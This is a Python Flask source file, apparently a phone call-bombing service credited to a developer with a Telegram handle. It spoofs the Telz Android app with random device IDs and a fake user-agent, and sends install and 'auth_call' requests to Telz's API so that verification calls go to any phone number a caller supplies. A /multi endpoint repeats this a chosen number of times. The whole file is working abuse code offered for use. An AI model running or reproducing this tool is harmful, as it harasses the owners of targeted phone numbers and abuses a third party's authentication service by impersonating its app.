from flask import Flask, request, jsonify
import requests
import json
import random
import string
import time
import uuid

app = Flask(__name__)

@app.route('/')
def index():
    return "API is working"

@app.route('/call')
def call():
    # الحصول على رقم الهاتف من الباراميتر
    phone = request.args.get('phone')
    
    if not phone:
        return {
            "result": "Phone number is required",
            "developer": "Adel Fox",
            "telegram": "@Opps_Error"
        }
    
    try:
        # إنشاء بيانات عشوائية للجهاز
        android_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        uuid_val = str(uuid.uuid4())
        timestamp = int(time.time() * 1000)
        
        # إعدادات
        APP_VERSION = "17.5.17"
        OS_VERSION = "9"
        LANGUAGE = "ar"
        BASE_URL = "https://api.telz.com/app"
        HEADERS = {
            'User-Agent': f"Telz-Android/{APP_VERSION}",
            'Content-Type': "application/json"
        }
        
        # 1. إرسال طلب التثبيت
        install_payload = {
            "android_id": android_id,
            "app_version": APP_VERSION,
            "event": "install",
            "google_exists": "yes",
            "os": "android",
            "os_version": OS_VERSION,
            "play_market": True,
            "ts": timestamp,
            "uuid": uuid_val
        }
        
        install_response = requests.post(
            f"{BASE_URL}/install", 
            data=json.dumps(install_payload), 
            headers=HEADERS
        )
        
        # 2. إرسال طلب المكالمة
        call_payload = {
            "android_id": android_id,
            "app_version": APP_VERSION,
            "attempt": "0",
            "event": "auth_call",
            "lang": LANGUAGE,
            "os": "android",
            "os_version": OS_VERSION,
            "phone": f"+{phone}",
            "ts": timestamp,
            "uuid": uuid_val
        }
        
        call_response = requests.post(
            f"{BASE_URL}/auth_call", 
            data=json.dumps(call_payload), 
            headers=HEADERS
        )
        
        # طباعة الرد للكونسول
        print(f"Install Response: {install_response.text}")
        print(f"Call Response: {call_response.text}")
        
        # التحقق من النتيجة
        if install_response.ok and "ok" in install_response.text and call_response.ok and "ok" in call_response.text:
            return {
                "result": "Call sent successfully",
                "developer": "Adel Fox",
                "telegram": "@Opps_Error",
                "phone": phone
            }
        else:
            return {
                "result": "Failed to send call",
                "developer": "Adel Fox",
                "telegram": "@Opps_Error"
            }
            
    except Exception as e:
        return {
            "result": f"Error: {str(e)}",
            "developer": "Adel Fox",
            "telegram": "@Opps_Error"
        }

@app.route('/multi')
def multi():
    # الحصول على الباراميترات
    phone = request.args.get('phone')
    count = request.args.get('count', 1)
    
    if not phone:
        return {
            "result": "Phone number is required",
            "developer": "Adel Fox",
            "telegram": "@Opps_Error"
        }
    
    try:
        count = int(count)
        results = []
        
        for i in range(count):
            try:
                # إرسال طلب واحد
                response = call_single_request(phone)
                results.append(response)
                
                # انتظار 60 ثانية بين المحاولات
                if i < count - 1:
                    time.sleep(60)
                    
            except Exception as e:
                results.append(f"Attempt {i+1} failed: {str(e)}")
        
        return {
            "result": f"Processed {len(results)} attempts",
            "attempts": results,
            "developer": "Adel Fox",
            "telegram": "@Opps_Error"
        }
        
    except Exception as e:
        return {
            "result": f"Error: {str(e)}",
            "developer": "Adel Fox",
            "telegram": "@Opps_Error"
        }

def call_single_request(phone):
    """دالة مساعدة لإرسال طلب واحد"""
    # إنشاء بيانات عشوائية للجهاز
    android_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    uuid_val = str(uuid.uuid4())
    timestamp = int(time.time() * 1000)
    
    # إعدادات
    APP_VERSION = "17.5.17"
    OS_VERSION = "9"
    LANGUAGE = "ar"
    BASE_URL = "https://api.telz.com/app"
    HEADERS = {
        'User-Agent': f"Telz-Android/{APP_VERSION}",
        'Content-Type': "application/json"
    }
    
    # 1. إرسال طلب التثبيت
    install_payload = {
        "android_id": android_id,
        "app_version": APP_VERSION,
        "event": "install",
        "google_exists": "yes",
        "os": "android",
        "os_version": OS_VERSION,
        "play_market": True,
        "ts": timestamp,
        "uuid": uuid_val
    }
    
    install_response = requests.post(
        f"{BASE_URL}/install", 
        data=json.dumps(install_payload), 
        headers=HEADERS
    )
    
    # 2. إرسال طلب المكالمة
    call_payload = {
        "android_id": android_id,
        "app_version": APP_VERSION,
        "attempt": "0",
        "event": "auth_call",
        "lang": LANGUAGE,
        "os": "android",
        "os_version": OS_VERSION,
        "phone": f"+{phone}",
        "ts": timestamp,
        "uuid": uuid_val
    }
    
    call_response = requests.post(
        f"{BASE_URL}/auth_call", 
        data=json.dumps(call_payload), 
        headers=HEADERS
    )
    
    if install_response.ok and "ok" in install_response.text and call_response.ok and "ok" in call_response.text:
        return "Success"
    else:
        return "Failed"

if __name__ == '__main__':
    app.run(debug=True)